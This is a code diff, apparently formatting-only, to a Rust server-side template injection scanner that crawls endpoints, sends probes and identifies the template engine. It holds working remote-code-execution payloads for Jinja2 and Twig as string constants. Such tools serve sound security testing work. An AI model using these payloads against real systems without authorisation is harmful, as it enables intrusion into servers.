@@ -40,8 +40,7 @@ const EXPECT_49: &str = "49";
 const EXPECT_JINJA2: &str = "7777777";
 
 // RCE verification payloads per engine
-const RCE_JINJA2: &str =
-    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}";
+const RCE_JINJA2: &str = "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}";
 const RCE_TWIG: &str =
     "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}";
 const RCE_FREEMARKER: &str =
@@ -138,9 +137,7 @@ fn now_rfc3339() -> String {
 
 // Sanitize a timestamp string for use in a filename (colons → underscores)
 fn ts_for_filename(ts: &str) -> String {
-    ts.chars()
-        .map(|c| if c == ':' { '_' } else { c })
-        .collect()
+    ts.chars().map(|c| if c == ':' { '_' } else { c }).collect()
 }
 
 // Collect injectable endpoints from crawl host subdirectories
@@ -186,10 +183,7 @@ async fn send_probe(
             .send()
             .await
     } else {
-        client
-            .get(format!("{clean}?{param}={probe}"))
-            .send()
-            .await
+        client.get(format!("{clean}?{param}={probe}")).send().await
     };
     match result {
         Ok(r) => r.text().await.unwrap_or_default(),
@@ -211,12 +205,7 @@ async fn probe_endpoint(
     let body_erb = send_probe(&client, &url, &param, &method, PROBE_ERB).await;
 
     // Identify engine from probe responses
-    let engine = identify_engine(
-        &body_curly,
-        &body_twig_jinja,
-        &body_dollar,
-        &body_erb,
-    );
+    let engine = identify_engine(&body_curly, &body_twig_jinja, &body_dollar, &body_erb);
 
     if engine == Engine::Unknown {
         // Also check hash and star probes
